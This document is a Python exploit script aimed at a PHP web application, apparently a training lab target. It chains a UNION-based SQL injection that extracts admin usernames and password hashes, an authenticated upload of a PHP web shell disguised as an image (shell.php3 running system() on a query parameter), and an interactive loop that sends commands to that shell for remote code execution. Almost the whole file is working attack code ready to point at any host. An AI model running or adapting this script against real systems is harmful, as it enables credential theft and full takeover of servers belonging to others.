import argparse, requests, socket, urllib.parse

# Execute SQLI payload and returns a list of results
def get_admin_password(http_string: str) -> list[str]:
  out = []
  resp = requests.get(f"{http_string}/cat.php?id=1+union+select+1,concat(login,'%20',password),3,4+from+users--")  
  lines = resp.text.split("\n")

  for i in lines:
    if "<img" in i:
      out.append(i.rstrip().lstrip().replace(" "*10, ""))

  return out


# Function upload a php web shell to the victim and then displays the results.
def upload_shell_ex(ip: str, port: int, cookie: str) -> list[str]:
  out = []

  # Connect to the server
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((ip, port))

  base_url = f"http://{ip}:{port}"
  path = "/admin/new.php"
  redirect = "/admin/index.php"
  url = f"{base_url}{path}"
  
  # Create the request to upload the file.
  shl_req = f'''POST {redirect} HTTP/1.1
Host: {ip}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17067549471680810867527278894
Content-Length: 560
Origin: http://{ip}
Connection: close
Referer: {url}
Cookie: {cookie}
Upgrade-Insecure-Requests: 1

-----------------------------17067549471680810867527278894
Content-Disposition: form-data; name="title"

shell
-----------------------------17067549471680810867527278894
Content-Disposition: form-data; name="image"; filename="shell.php3"
Content-Type: application/octet-stream

<?php echo system($_GET["cmd"]); ?>
-----------------------------17067549471680810867527278894
Content-Disposition: form-data; name="category"

1
-----------------------------17067549471680810867527278894
Content-Disposition: form-data; name="Add"

Add
-----------------------------17067549471680810867527278894--
'''
  
  # Send the payload and receive the response.
  s.send(shl_req.encode("utf-8"))
  resp = s.recv(4096)
  resp = urllib.parse.unquote(resp)
  
  # Check the status code.
  chunks = resp.split("\r\n")
  if "200 OK" in chunks[0]:
    print("Successfully uploaded shell")

    # Make a request to all.php and display all files to the screen.
    photos = requests.get(f"{base_url}/all.php")
    sh_shell = photos.text.split("\n")
    
    for i in sh_shell:
      if "<img" in i:
        out.append(i.lstrip().rstrip().replace(" "*10, ""))

  
  s.close()
  return out


# Get the IP address and port of the web server.
parser = argparse.ArgumentParser(description="Place holder")
parser.add_argument("ip_address")
parser.add_argument("-p", "--port", action="store", type=int, required=False)
parser.add_argument("-c", "--cookie", action="store", type=str)
parser.add_argument("-a", "--admin_password", action="store_true")
parser.add_argument("-u", "--upload_shell", action="store_true")
parser.add_argument("-e", "--execute_webshell", action="store_true")

args = parser.parse_args()

ip = args.ip_address
port = 0
cookie = args.cookie
admin_password = args.admin_password
upload_shl = args.upload_shell
execute_shl = args.execute_webshell

# IF the port is empty, set to 80 by default.
if args.port == 0:
  port = 80
else:
  port = args.port

# Create the base address
http_address = f"http://{ip}:{port}"
print(f"\nConnecting to {ip}:{port}")

if admin_password == False and upload_shl == False and execute_shl == False:
  print(f"Info: -a/-u/-e required to grab admin password hash, upload webshell, or execute shell")

# Execute the SQLI payload and extract the admin password hash from the html.
if admin_password == True:
  lines = get_admin_password(http_address)
  for key in lines:
    if "alt=\"admin" in key:
      print(f"username/hash: {key}")

# Code block upload a php web shell to the victim
if upload_shl == True:
  results = upload_shell_ex(ip, port, cookie)
  
  if len(results) == 0:
    print("Cookie not valid")
    exit(1)
  for i in results:
    print(i)

# Code block runs in a loop and allows the user to perform remote code execution in a reverse shell like fashion.
if execute_shl == True:
  while True:
    cmd = input("shell> ")
    if "exit" in cmd:
      exit(0)

    resp = requests.get(f"{http_address}/admin/uploads/shell.php3?cmd={cmd}")
    status = resp.status_code
    text = resp.text

    if status != 200:
      print(f"status: {status} - received no response")
    else:
      if len(text) < 1:
        print(f"{text}")
      else:
        print(f"{text}\n")
